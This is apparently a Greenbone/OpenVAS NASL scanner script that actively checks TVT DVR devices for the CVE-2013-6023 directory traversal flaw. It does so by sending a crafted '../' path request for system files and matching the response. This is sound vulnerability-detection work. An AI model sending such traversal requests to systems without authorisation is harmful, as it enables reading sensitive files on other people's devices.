# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803784");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-12-05 16:15:57 +0530 (Thu, 05 Dec 2013)");

  script_cve_id("CVE-2013-6023");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("TVT DVR <= 3.2.0.P-3520A-00 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Cross_Web_Server/banner");

  script_tag(name:"summary", value:"TVT DVR is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an improper sanitation of encoded user input
  via HTTP requests using directory traversal attack (e.g., ../).");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the target system.");

  script_tag(name:"affected", value:"TVT TD-2308SS-B DVR with firmware 3.2.0.P-3520A-00 and
  prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/785838");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63360");
  script_xref(name:"URL", value:"http://jvn.jp/cert/JVNVU97210126/index.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124231");
  script_xref(name:"URL", value:"http://alguienenlafisi.blogspot.in/2013/10/dvr-tvt-directory-traversal.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (banner !~ "Server\s*:\s*Cross Web Server")
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = "/" + crap(data:"../",length:15) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
